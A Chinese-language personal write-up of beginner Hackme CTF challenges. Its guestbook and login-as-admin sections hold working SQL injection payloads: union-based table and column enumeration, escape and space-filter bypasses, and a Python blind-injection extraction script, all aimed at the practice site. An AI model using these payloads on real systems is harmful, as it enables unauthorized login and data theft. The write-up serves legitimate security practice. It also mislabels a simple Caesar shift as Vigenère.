# Hackme CTF
###### tags: `Hackme CTF`
這篇筆記主要是紀錄一下自己的 Hackme CTF 的 write up，打算慢慢寫，解到哪寫到哪，做個紀錄，希望最終能把 100 題全都解完~
:::warning
只紀錄解題過程不紀錄 flag
:::
[TOC]
## flag
- 送分題，直接給 flag。

##  pusheen.txt
- 題目的 xz 解壓縮是一個 txt，裡面都是黑白貓，直覺想到轉成 0 跟 1 試試。
    ```python=
    # -*- coding: utf-8 -*-
    with open('pusheen.txt', 'r') as f:
        data = f.readlines()
    code = ""
    for i in range(0, len(data), 16):
        if "▒" in data[i+8]:
            code+="1"
        else:
            code+="0"
    print(code)
    ```
- 得到的 binary 轉 hex 再轉成 ascii 就是 flag 了。(cyberchef)

    ![](https://i.imgur.com/3exAUOU.png)

## hide and seek
- 看到這題剛好想到會不會頁面本身有藏 FLAG，看了 scoreboard 好像沒看到甚麼明顯的。
- 回到 homepage F12 Ctrl+F 搜尋 flag 字串就會發現有個隱藏 flag。

## guestbook
- 網頁就是個記事本，建一個 New post 後，到 message list 可以看到。
- 點開 post 會發現他是用 id 做 sql 查詢，很有 sql injection 的味道。

    ![](https://i.imgur.com/0hSoGeJ.png)

- 先用 union 試試 column 數量，試到 4 正常顯示，沒有 syntax error，得知 colum 4 個。
    - `https://ctf.hackme.quest/gb/?mod=read&id=0%20union%20select%201,2,3,4`

- 能顯示出的 (2, 3, 4) 就可以替換成想要偷的資料。
- 先找出目前所在 db 的名字。
    - `https://ctf.hackme.quest/gb/?mod=read&id=0%20union%20select%201,2,3,database()`

- 再來找 db 存在的資料表，用 union + limit，從 0 開始試，就找到 flag 資料表了。
    - `https://ctf.hackme.quest/gb/?mod=read&id=0%20union%20select%201,2,3,(select%20table_name%20FROM%20information_schema.tables%20limit%200,1)`
    - 
- 用一樣方式找 column，4 改下面的子查詢，limit 0, 1 就拿到 flag 欄位了
    - `SELECT column_name FROM information_schema.columns WHERE table_schema="g8" AND table_name="flag" limit 0, 1`

- 再來就是要從 flag column 找看看 flag，也是一樣方式，這次 limit 1, 1才拿到 flag，前面是個旋轉貓貓的.gif
    - `SELECT flag from flag limit 1,1`
## homepage
- homepage F12 打開 console 會看到一 QRcode。
- 掃描後就得到 flag。

    ![](https://i.imgur.com/tlCWJa0.png)

- 比較哭的是用 line 掃 space 字元會被吃掉 0.0，後來載 QRcode 掃描器才拿到正確 flag。

## scorecoard
- HTML 原始碼中沒有藏 FLAG，那哪裡還有可能藏資訊呢? 可以想想 HTTP 有什麼東西。
- F12 Network 下發現 server 回傳的 response 藏了東西。

    ![](https://i.imgur.com/yb3Yies.png)

## login as admin 0
- 題目給的 source code 可以看到做以黑名單的方式做 filter，另外會將 `'` replace 成 `\'`。
- 這樣在合進 sql 語法時就可以直接是 `username = '\''` (也就是 ' 的 escape)，就不會有單引號的功能。
- 繞過方法也很簡單，輸入`'` 時前面多加個`\`，合到 sql 字串就會變成`username = '\\''` 會 escape 掉`\`，變成`\'`字串，而不是 ' 的 escape，單引號就又有功能了。
- 最後再用 limit 來找 admin 的 data 登入，就完事了。
    - `\' or 2=2 limit 1, 1 #`

## login as admin 0.1
- 用 `\' union select 1, 2, 3, 4 #` 可以登入，得知 column 數是 4。

    ![](https://i.imgur.com/OwxBcm1.png)
- Username 可以看到 2，所以我們可以在這邊去 leak 出其他 data。
- 嘗試`\' union select 1, (SELECT table_name FROM information_schema.tables where table_schema = database() limit 0, 1), 3, 4 #` 來 leak 出資料庫的其他資料表，馬上就發現 `h1dden_f14g` 資料表。
- `\' union select 1, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name= (SELECT table_name FROM information_schema.tables where table_schema = database() limit 0, 1) limit 0, 1), 3, 4 #` 從 `h1dden_f14g` 找，發現 `the_f14g` column。
- 得知 table name 跟 column name 就完事了
`\' union select 1, (SELECT  the_f14g FROM h1dden_f14g limit 0, 1) ,3,4 #`

## login as admin 1
- 這題跟前面很像，就是 filter 不一樣而已。
- 空格用 `/**/` 繞過，稍微改一下就可以找到 admin 登入。
`\'/**/or/**/2=2/**/limit/**/1,1/**/#`

## login as admin 1.2
- 這題要不斷用 bolean base sqli 去 leak data。
- 可以先找長度。
`\'/**/or/**/(length((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))>1/**/limit/**/1,1/**/#`
- 再接著 leak 出字串。
`\'/**/or/**/(ascii(substr((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),1,1)))>10/**/limit/**/1,1/**/#`
- 當然不可能一個字一個字慢慢 leak，寫一個 binary search 的 python 腳本。(截了張 leak 出的 table_name)
    ![](https://i.imgur.com/oX5xzbP.png)
```python=
import requests

url = "https://ctf.hackme.quest/login1/"
password = "test"

def boolean_base_binary_search(index, low, upper):
    mid = 0
    while low <= upper:
        mid = (low + upper)//2
        # condition = f'(ascii(substr((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{index},1)))>{mid}'
        # condition = f'(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()/**/AND/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139/**/limit/**/0,1),{index},1)))>{mid}'
        ######## length ########
        # condition = f'(length((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1)))>{mid}'
        ######## length ########
        condition = f'(ascii(substr((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1),{index},1)))>{mid}'
        sql = f"\\'/**/or/**/{condition}/**/limit/**/1,1/**/#"
        my_data = {'name': sql, 'password': password}
        r = requests.post(url, data = my_data)
        if "FLAG" in r.text:
            low = mid + 1
        else:
            upper =  mid - 1
    
    condition = f'(ascii(substr((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1),{index},1)))>{mid}'
    sql = f"\\'/**/or/**/{condition}/**/limit/**/1,1/**/#"
    my_data = {'name': sql, 'password': password}
    r = requests.post(url, data = my_data)
    if "FLAG" in r.text:
        mid += 1
    print("target" + str(index) + ":" + chr(mid)+ f"({mid})")
    return chr(mid)

def find_flag():
    flag = ""
    for i in range(1,67):
         flag += boolean_base_binary_search(i, 0, 130)
    return flag


print(f'flag:{find_flag()}')
```
- 找 column 時原本以為單引號跟雙引號都被擋掉，所以把 database_name 轉 16 進位輸入。
    ![](https://i.imgur.com/4aHHHDF.png)
`/**/or/**/(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()/**/AND/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139/**/limit/**/0,1),{index},1)))>{mid}/**/limit/**/1,1/**/#`
- 結果後來發現其實沒檔雙引號，所以可以直接用原字串就好。
- 後面就都依樣用腳本 leak 出 flag，完工~

## helloworld
- 開 ida 看可以看到有個 cmp 指令比對輸入的數字是否等於 314159265。

    ![](https://i.imgur.com/5cvyZKa.png)

## catflag
- nc 連過去等 5 秒後 cat flag 就好。

    ![](https://i.imgur.com/xTrZfSA.png)

## easy
```526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d```
- 字串看起來是 16 進位組成，轉換後很直覺想到 base64 轉換。
    ![](https://i.imgur.com/U0OvN1Z.png)


## r u kidding
```EKZF{Hs'r snnn dzrx, itrs bzdrzq bhogdq}```
- 這一看就知道是 base on 凱薩加密的維吉尼亞加密(vigenia encode)。
- 就是簡單的 shift，不過是針對字母的。
```python=
flag = "EKZF{Hs'r snnn dzrx, itrs bzdrzq bhogdq}"
flag_r = ""
for i in flag:
    if i.isalpha():
        if i == 'z':
            flag_r += chr(ord('a'))
        elif i == 'Z':
            flag_r += chr(ord('A'))
        else:
            flag_r += chr(ord(i)+1)
    else:
        flag_r += chr(ord(i))
print(flag_r)
```
- 用 python 解出 flag 後想說應該有更快速的解法，看了一下別人的 write up。
- 其實 cyber chef 就可以直接解了。

    ![](https://i.imgur.com/PNvMVLB.png)


